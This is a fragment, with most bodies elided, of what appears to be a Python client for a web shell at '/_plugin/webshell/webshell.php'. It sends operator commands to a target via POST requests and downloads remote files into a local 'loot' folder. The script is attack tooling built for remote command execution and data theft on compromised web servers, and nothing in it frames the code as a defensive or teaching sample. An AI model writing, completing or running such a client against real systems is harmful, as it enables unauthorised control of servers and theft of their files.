...
def remote_exec(target, endpoint, cmd, verbose=False):
    try:
        r = requests.post(
            "%s/%s" % (target, endpoint),
            data={
...
def remote_download(target, endpoint, remote_path, local_path="./loot/"):
...
if __name__ == '__main__':
    ...
    endpoint = "/_plugin/webshell/webshell.php"
    ...
    while running:
        ...
        if args[0] == "exit":
            ...
            if len(args) != 2 and len(args) != 3:
                ...
                remote_download(options.target, endpoint, remote_path=args[1])
            elif len(args) == 3:
                remote_download(options.target, endpoint, remote_path=args[1], local_path=args[2])
        else:
            remote_exec(options.target, endpoint, cmd, verbose=options.verbose)
